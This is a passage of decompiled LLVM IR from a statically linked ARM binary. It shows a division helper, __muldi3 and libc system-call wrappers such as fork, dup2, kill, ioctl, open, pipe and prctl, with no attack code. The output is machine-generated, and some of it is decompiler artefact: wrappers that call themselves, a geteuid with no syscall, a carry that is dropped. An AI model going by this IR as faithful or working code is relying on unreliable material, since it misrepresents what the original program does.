  %v5_13e44 = icmp slt i32 %v0_13e40, -2
  br i1 %v5_13e44, label %dec_label_pc_13e64, label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e40
  %v8_13e40 = icmp eq i32 %v0_13e40, -2
  br i1 %v8_13e40, label %dec_label_pc_13e58, label %dec_label_pc_13e4c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e48
  %v3_13e4c = icmp ult i32 %v1_13e50, %v0_13e54
  br i1 %v3_13e4c, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_13e4c
  %v2_13e4c = sub i32 %v1_13e50, %v0_13e54
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_13e4c, %bb93
  %v0_13e5854 = phi i32 [ %v1_13e50, %dec_label_pc_13e4c ], [ %v2_13e4c, %bb93 ]
  %v3_13e54 = udiv i32 %v0_13e54, 2
  br label %dec_label_pc_13e58

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e48, %bb94
  %v0_13e60 = phi i32 [ %v0_13e54, %dec_label_pc_13e48 ], [ %v3_13e54, %bb94 ]
  %v1_13e5c = phi i32 [ %v1_13e50, %dec_label_pc_13e48 ], [ %v0_13e5854, %bb94 ]
  %v3_13e58 = icmp ult i32 %v1_13e5c, %v0_13e60
  br i1 %v3_13e58, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_13e58
  %v2_13e58 = sub i32 %v1_13e5c, %v0_13e60
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_13e58, %bb95
  %v0_13e6457 = phi i32 [ %v1_13e5c, %dec_label_pc_13e58 ], [ %v2_13e58, %bb95 ]
  %v3_13e60 = udiv i32 %v0_13e60, 2
  br label %dec_label_pc_13e64

dec_label_pc_13e64:                               ; preds = %dec_label_pc_13e40, %bb96
  %v2_13e68 = phi i32 [ %v0_13e54, %dec_label_pc_13e40 ], [ %v3_13e60, %bb96 ]
  %v1_13e68 = phi i32 [ %v1_13e50, %dec_label_pc_13e40 ], [ %v0_13e6457, %bb96 ]
  %v3_13e64 = icmp ult i32 %v1_13e68, %v2_13e68
  br i1 %v3_13e64, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_13e64
  %v2_13e64 = sub i32 %v1_13e68, %v2_13e68
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13e64, %bb83, %.thread72, %dec_label_pc_13e34, %bb92, %bb97
  %v1_13e70 = phi i32 [ %v1_13e10.v6_13e10.v6_13e18.v6_13e20, %dec_label_pc_13e34 ], [ 0, %bb92 ], [ %v1_13e68, %dec_label_pc_13e64 ], [ %v2_13e64, %bb97 ], [ %v3_13dc8, %.thread72 ], [ %v1_13dbc, %bb83 ]
  br i1 %v1_13db0, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_13e70 = sub i32 0, %v1_13e70
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_13e74 = phi i32 [ %v1_13e70, %.thread6 ], [ %v2_13e70, %bb98 ]
  ret i32 %v1_13e74

dec_label_pc_13e78:                               ; preds = %entry
  %v0_13e78 = load i32, i32* @lr, align 4
  %v0_13e7c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_13e78)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_13e54, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_13e34, { 1, 0, 2 }
  uselistorder i32 %v7_13e2c, { 1, 0 }
  uselistorder i32 %v3_13e28, { 1, 0 }
  uselistorder i32 %v1_13e10.v6_13e10.v6_13e18.v6_13e20, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_13e1c, { 1, 0 }
  uselistorder i32 %v4_13e14, { 1, 0 }
  uselistorder i32 %v4_13e0c, { 1, 0 }
  uselistorder i32 %v6_13e2c, { 3, 0, 2, 1 }
  uselistorder i32 %v2_13dfc, { 1, 0 }
  uselistorder i32 %v1_13df0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_13dec, { 1, 0, 3, 2 }
  uselistorder i32 %v4_13ddc, { 1, 0, 3, 2 }
  uselistorder i32 %v0_13de8.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13dbc, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_13dc4, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_13e64, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13e58, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_13e04, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_13e88 = load i32, i32* @r0, align 4
  ret i32 %v1_13e88
}

define i32 @__muldi3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_13e98 = udiv i32 %arg1, 65536
  %v3_13e9c = udiv i32 %arg3, 65536
  %tmp = mul i32 %v3_13e98, -65536
  %v5_13ea0 = add i32 %tmp, -1
  %v6_13ea0 = and i32 %v5_13ea0, %arg1
  %tmp10 = mul i32 %v3_13e9c, -65536
  %v5_13ea4 = add i32 %tmp10, -1
  %v6_13ea4 = and i32 %v5_13ea4, %arg3
  %v2_13ea8 = mul i32 %v6_13ea4, %v6_13ea0
  %v2_13eac = mul i32 %v6_13ea4, %v3_13e98
  %v2_13eb0 = mul i32 %v6_13ea0, %v3_13e9c
  %v2_13eb8 = add i32 %v2_13eac, %v2_13eb0
  %v3_13eb8 = icmp ult i32 %v2_13eb8, %v2_13eac
  br i1 %v3_13eb8, label %bb, label %bb9

bb:                                               ; preds = %entry
  br label %bb9

bb9:                                              ; preds = %entry, %bb
  %v4_13ec0 = mul i32 %v2_13eb8, 65536
  %v5_13ec0 = add i32 %v4_13ec0, %v2_13ea8
  ret i32 %v5_13ec0

; uselistorder directives
  uselistorder i32 %v2_13eac, { 1, 0 }
  uselistorder i32 %v6_13ea0, { 1, 0 }
  uselistorder i32 %v3_13e9c, { 1, 0 }
  uselistorder i32 %v3_13e98, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_13ee0 = call i32 @vfork()
  store i32 %v0_13ee0, i32* @r0, align 4
  %v2_13ee4 = icmp ugt i32 %v0_13ee0, -4097
  br i1 %v2_13ee4, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_13ef8, %entry
  %merge = phi i32 [ %v0_13ee0, %entry ], [ %v0_13ef8, %dec_label_pc_13ef8 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_13ef0 = icmp eq i32 %v0_13ee0, -38
  br i1 %v4_13ef0, label %dec_label_pc_13ef8, label %bb2

dec_label_pc_13ef8:                               ; preds = %bb1
  %v0_13ef8 = call i32 @fork()
  store i32 %v0_13ef8, i32* @r0, align 4
  %v2_13efc = icmp ugt i32 %v0_13ef8, -4097
  br i1 %v2_13efc, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_13ef8
  %v0_13f04 = call i32 @__syscall_error()
  ret i32 %v0_13f04

; uselistorder directives
  uselistorder i32 %v0_13ef8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_13f10 = load i32, i32* @r2, align 4
  %v1_13f20 = add i32 %arg2, -12
  store i32 %v6_13f10, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_13f20, 2
  br i1 %tmp, label %dec_label_pc_13f48, label %dec_label_pc_13f40

dec_label_pc_13f40:                               ; preds = %entry
  %v0_13f40 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_13f74

dec_label_pc_13f48:                               ; preds = %entry
  %v2_13f50 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_13f50, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_13f50, -4095
  br i1 %tmp8, label %dec_label_pc_13f74, label %dec_label_pc_13f60

dec_label_pc_13f60:                               ; preds = %dec_label_pc_13f48
  %v0_13f60 = call i32 @__errno_location()
  %v0_13f64 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f64 = sub i32 0, %v0_13f64
  %v2_13f68 = inttoptr i32 %v0_13f60 to i32*
  store i32 %v1_13f64, i32* %v2_13f68, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13f74

dec_label_pc_13f74:                               ; preds = %dec_label_pc_13f60, %dec_label_pc_13f48, %dec_label_pc_13f40
  %storemerge = phi i32 [ %v0_13f40, %dec_label_pc_13f40 ], [ %v2_13f50, %dec_label_pc_13f48 ], [ -1, %dec_label_pc_13f60 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_13f50, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_13fa4 = load i32, i32* @r0, align 4
  store i32 %v0_13fa4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fa4, -4095
  br i1 %tmp, label %dec_label_pc_13fc0, label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %entry
  %v0_13fb0 = call i32 @__errno_location()
  %v0_13fb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_13fb4 = sub i32 0, %v0_13fb4
  %v2_13fb8 = inttoptr i32 %v0_13fb0 to i32*
  store i32 %v1_13fb4, i32* %v2_13fb8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %entry, %dec_label_pc_13fb0
  %v0_13fc0 = phi i32 [ %v0_13fa4, %entry ], [ -1, %dec_label_pc_13fb0 ]
  ret i32 %v0_13fc0

; uselistorder directives
  uselistorder i32 %v0_13fa4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fc0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @access() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ffc = load i32, i32* @r4, align 4
  store i32 %v3_13ffc, i32* %stack_var_-8, align 4
  %v0_14000 = call i32 @access()
  store i32 %v0_14000, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14000, -4095
  br i1 %tmp, label %dec_label_pc_14020, label %dec_label_pc_14010

dec_label_pc_14010:                               ; preds = %entry
  %v0_14010 = call i32 @__errno_location()
  %v0_14014 = load i32, i32* %r4.global-to-local, align 4
  %v1_14014 = sub i32 0, %v0_14014
  %v2_14018 = inttoptr i32 %v0_14010 to i32*
  store i32 %v1_14014, i32* %v2_14018, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %entry, %dec_label_pc_14010
  %v0_14020 = phi i32 [ %v0_14000, %entry ], [ -1, %dec_label_pc_14010 ]
  %v2_14024 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14024, i32* @r4, align 4
  ret i32 %v0_14020

; uselistorder directives
  uselistorder i32 %v0_14000, { 1, 0, 2 }
  uselistorder i32 ()* @access, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14020, { 1, 0 }
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14028 = load i32, i32* @r4, align 4
  store i32 %v3_14028, i32* %stack_var_-8, align 4
  %v0_1402c = call i32 @chdir()
  store i32 %v0_1402c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1402c, -4095
  br i1 %tmp, label %dec_label_pc_1404c, label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %entry
  %v0_1403c = call i32 @__errno_location()
  %v0_14040 = load i32, i32* %r4.global-to-local, align 4
  %v1_14040 = sub i32 0, %v0_14040
  %v2_14044 = inttoptr i32 %v0_1403c to i32*
  store i32 %v1_14040, i32* %v2_14044, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %entry, %dec_label_pc_1403c
  %v0_1404c = phi i32 [ %v0_1402c, %entry ], [ -1, %dec_label_pc_1403c ]
  %v2_14050 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14050, i32* @r4, align 4
  ret i32 %v0_1404c

; uselistorder directives
  uselistorder i32 %v0_1402c, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_1404c, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14054 = load i32, i32* @r4, align 4
  store i32 %v3_14054, i32* %stack_var_-8, align 4
  %v1_14058 = call i32 @close(i32 %arg1)
  store i32 %v1_14058, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_14058, -4095
  br i1 %tmp, label %dec_label_pc_14078, label %dec_label_pc_14068

dec_label_pc_14068:                               ; preds = %entry
  %v0_14068 = call i32 @__errno_location()
  %v0_1406c = load i32, i32* %r4.global-to-local, align 4
  %v1_1406c = sub i32 0, %v0_1406c
  %v2_14070 = inttoptr i32 %v0_14068 to i32*
  store i32 %v1_1406c, i32* %v2_14070, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %entry, %dec_label_pc_14068
  %v0_14078 = phi i32 [ %v1_14058, %entry ], [ -1, %dec_label_pc_14068 ]
  %v2_1407c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1407c, i32* @r4, align 4
  ret i32 %v0_14078

; uselistorder directives
  uselistorder i32 %v1_14058, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14078, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14080 = load i32, i32* @r4, align 4
  store i32 %v3_14080, i32* %stack_var_-8, align 4
  %v0_14084 = call i32 @dup2()
  store i32 %v0_14084, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14084, -4095
  br i1 %tmp, label %dec_label_pc_140a4, label %dec_label_pc_14094

dec_label_pc_14094:                               ; preds = %entry
  %v0_14094 = call i32 @__errno_location()
  %v0_14098 = load i32, i32* %r4.global-to-local, align 4
  %v1_14098 = sub i32 0, %v0_14098
  %v2_1409c = inttoptr i32 %v0_14094 to i32*
  store i32 %v1_14098, i32* %v2_1409c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140a4

dec_label_pc_140a4:                               ; preds = %entry, %dec_label_pc_14094
  %v0_140a4 = phi i32 [ %v0_14084, %entry ], [ -1, %dec_label_pc_14094 ]
  %v2_140a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140a8, i32* @r4, align 4
  ret i32 %v0_140a4

; uselistorder directives
  uselistorder i32 %v0_14084, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_140a4, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140ac = load i32, i32* @r4, align 4
  store i32 %v3_140ac, i32* %stack_var_-8, align 4
  %v0_140b0 = call i32 @fork()
  store i32 %v0_140b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_140b0, -4095
  br i1 %tmp, label %dec_label_pc_140d0, label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %entry
  %v0_140c0 = call i32 @__errno_location()
  %v0_140c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_140c4 = sub i32 0, %v0_140c4
  %v2_140c8 = inttoptr i32 %v0_140c0 to i32*
  store i32 %v1_140c4, i32* %v2_140c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140d0

dec_label_pc_140d0:                               ; preds = %entry, %dec_label_pc_140c0
  %v0_140d0 = phi i32 [ %v0_140b0, %entry ], [ -1, %dec_label_pc_140c0 ]
  %v2_140d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140d4, i32* @r4, align 4
  ret i32 %v0_140d0

; uselistorder directives
  uselistorder i32 %v0_140b0, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_140d0, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_140dc = ptrtoint i32* %stack_var_-12 to i32
  %v2_140e8 = call i32 @getrlimit(i32 7, i32 %v2_140dc)
  %v1_140ec = icmp slt i32 %v2_140e8, 0
  br i1 %v1_140ec, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_140f4 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_140fc = phi i32 [ 256, %entry ], [ %v5_140f4, %bb ]
  ret i32 %v5_140fc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14100 = load i32, i32* @r4, align 4
  store i32 %v3_14100, i32* %stack_var_-8, align 4
  %v0_14108 = load i32, i32* @r0, align 4
  store i32 %v0_14108, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14108, -4095
  br i1 %tmp, label %dec_label_pc_14124, label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %entry
  %v0_14114 = call i32 @__errno_location()
  %v0_14118 = load i32, i32* %r4.global-to-local, align 4
  %v1_14118 = sub i32 0, %v0_14118
  %v2_1411c = inttoptr i32 %v0_14114 to i32*
  store i32 %v1_14118, i32* %v2_1411c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14128.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14124

dec_label_pc_14124:                               ; preds = %entry, %dec_label_pc_14114
  %v2_14128 = phi i32 [ %v3_14100, %entry ], [ %v2_14128.pre, %dec_label_pc_14114 ]
  %v0_14124 = phi i32 [ %v0_14108, %entry ], [ -1, %dec_label_pc_14114 ]
  store i32 %v2_14128, i32* @r4, align 4
  ret i32 %v0_14124

; uselistorder directives
  uselistorder i32 %v0_14108, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14124, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1412c = load i32, i32* @r4, align 4
  store i32 %v3_1412c, i32* %stack_var_-8, align 4
  %v0_14130 = call i32 @getpid()
  store i32 %v0_14130, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14130, -4095
  br i1 %tmp, label %dec_label_pc_14150, label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %entry
  %v0_14140 = call i32 @__errno_location()
  %v0_14144 = load i32, i32* %r4.global-to-local, align 4
  %v1_14144 = sub i32 0, %v0_14144
  %v2_14148 = inttoptr i32 %v0_14140 to i32*
  store i32 %v1_14144, i32* %v2_14148, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14150

dec_label_pc_14150:                               ; preds = %entry, %dec_label_pc_14140
  %v0_14150 = phi i32 [ %v0_14130, %entry ], [ -1, %dec_label_pc_14140 ]
  %v2_14154 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14154, i32* @r4, align 4
  ret i32 %v0_14150

; uselistorder directives
  uselistorder i32 %v0_14130, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14150, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14158 = load i32, i32* @r4, align 4
  store i32 %v3_14158, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1417c, label %dec_label_pc_1416c

dec_label_pc_1416c:                               ; preds = %entry
  %v0_1416c = call i32 @__errno_location()
  %v0_14170 = load i32, i32* %r4.global-to-local, align 4
  %v1_14170 = sub i32 0, %v0_14170
  %v2_14174 = inttoptr i32 %v0_1416c to i32*
  store i32 %v1_14170, i32* %v2_14174, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_14180.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1417c

dec_label_pc_1417c:                               ; preds = %entry, %dec_label_pc_1416c
  %v2_14180 = phi i32 [ %v3_14158, %entry ], [ %v2_14180.pre, %dec_label_pc_1416c ]
  %v0_1417c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1416c ]
  store i32 %v2_14180, i32* @r4, align 4
  ret i32 %v0_1417c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1417c, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_141a0 = load i32, i32* @r0, align 4
  %v3_141a0 = call i32 @ioctl(i32 %v0_141a0, i32 %arg1, i32 %arg2)
  store i32 %v3_141a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_141a0, -4095
  br i1 %tmp, label %dec_label_pc_141c0, label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %entry
  %v0_141b0 = call i32 @__errno_location()
  %v0_141b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_141b4 = sub i32 0, %v0_141b4
  %v2_141b8 = inttoptr i32 %v0_141b0 to i32*
  store i32 %v1_141b4, i32* %v2_141b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_141c0

dec_label_pc_141c0:                               ; preds = %entry, %dec_label_pc_141b0
  %v0_141c0 = phi i32 [ %v3_141a0, %entry ], [ -1, %dec_label_pc_141b0 ]
  ret i32 %v0_141c0

; uselistorder directives
  uselistorder i32 %v3_141a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_141c0, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_141d4 = load i32, i32* @r4, align 4
  store i32 %v3_141d4, i32* %stack_var_-8, align 4
  %v0_141d8 = call i32 @kill()
  store i32 %v0_141d8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_141d8, -4095
  br i1 %tmp, label %dec_label_pc_141f8, label %dec_label_pc_141e8

dec_label_pc_141e8:                               ; preds = %entry
  %v0_141e8 = call i32 @__errno_location()
  %v0_141ec = load i32, i32* %r4.global-to-local, align 4
  %v1_141ec = sub i32 0, %v0_141ec
  %v2_141f0 = inttoptr i32 %v0_141e8 to i32*
  store i32 %v1_141ec, i32* %v2_141f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_141f8

dec_label_pc_141f8:                               ; preds = %entry, %dec_label_pc_141e8
  %v0_141f8 = phi i32 [ %v0_141d8, %entry ], [ -1, %dec_label_pc_141e8 ]
  %v2_141fc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_141fc, i32* @r4, align 4
  ret i32 %v0_141f8

; uselistorder directives
  uselistorder i32 %v0_141d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_141f8, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_14210 = and i32 %arg2, 64
  %v2_14210 = icmp eq i32 %v1_14210, 0
  br i1 %v2_14210, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_14200 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_14200, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_14220 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_14220, i32* @r2, align 4
  %v4_14228 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_1422c = icmp eq i32 %v4_14228, -4096
  store i1 %v7_1422c, i1* @cpsr_z, align 1
  store i32 %v4_14228, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_14228, -4095
  br i1 %tmp, label %dec_label_pc_14248, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %.thread1
  %v0_14238 = call i32 @__errno_location()
  %v0_1423c = load i32, i32* %r4.global-to-local, align 4
  %v1_1423c = sub i32 0, %v0_1423c
  %v2_14240 = inttoptr i32 %v0_14238 to i32*
  store i32 %v1_1423c, i32* %v2_14240, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %.thread1, %dec_label_pc_14238
  %v0_14248 = phi i32 [ %v4_14228, %.thread1 ], [ -1, %dec_label_pc_14238 ]
  ret i32 %v0_14248

; uselistorder directives
  uselistorder i32 %v4_14228, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_14248, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_14264 = load i32, i32* @r0, align 4
  %v2_14264 = inttoptr i32 %v0_14264 to i8*
  %v3_14264 = call i32 @__libc_open(i8* %v2_14264, i32 577)
  %v0_14268 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14268, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_14268 = and i32 %v3_14264, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_14268 = phi i32 [ %v3_14264, %entry ], [ %v6_14268, %bb ]
  ret i32 %v7_14268

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1426c = load i32, i32* @r4, align 4
  store i32 %v3_1426c, i32* %stack_var_-8, align 4
  %v1_14270 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_14270 = call i32 @pipe([2 x i32] %v1_14270)
  store i32 %v2_14270, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_14270, -4095
  br i1 %tmp, label %dec_label_pc_14290, label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %entry
  %v0_14280 = call i32 @__errno_location()
  %v0_14284 = load i32, i32* %r4.global-to-local, align 4
  %v1_14284 = sub i32 0, %v0_14284
  %v2_14288 = inttoptr i32 %v0_14280 to i32*
  store i32 %v1_14284, i32* %v2_14288, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14290

dec_label_pc_14290:                               ; preds = %entry, %dec_label_pc_14280
  %v0_14290 = phi i32 [ %v2_14270, %entry ], [ -1, %dec_label_pc_14280 ]
  %v2_14294 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14294, i32* @r4, align 4
  ret i32 %v0_14290

; uselistorder directives
  uselistorder i32 %v2_14270, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14290, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14298 = load i32, i32* @r4, align 4
  store i32 %v3_14298, i32* %stack_var_-8, align 4
  %v0_142a0 = call i32 @prctl()
  store i32 %v0_142a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_142a0, -4095
  br i1 %tmp, label %dec_label_pc_142c0, label %dec_label_pc_142b0

dec_label_pc_142b0:                               ; preds = %entry
  %v0_142b0 = call i32 @__errno_location()
  %v0_142b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_142b4 = sub i32 0, %v0_142b4
  %v2_142b8 = inttoptr i32 %v0_142b0 to i32*
  store i32 %v1_142b4, i32* %v2_142b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_142c0

dec_label_pc_142c0:                               ; preds = %entry, %dec_label_pc_142b0
  %v0_142c0 = phi i32 [ %v0_142a0, %entry ], [ -1, %dec_label_pc_142b0 ]
  %v2_142c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_142c4, i32* @r4, align 4
  ret i32 %v0_142c0

; uselistorder directives
  uselistorder i32 %v0_142a0, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
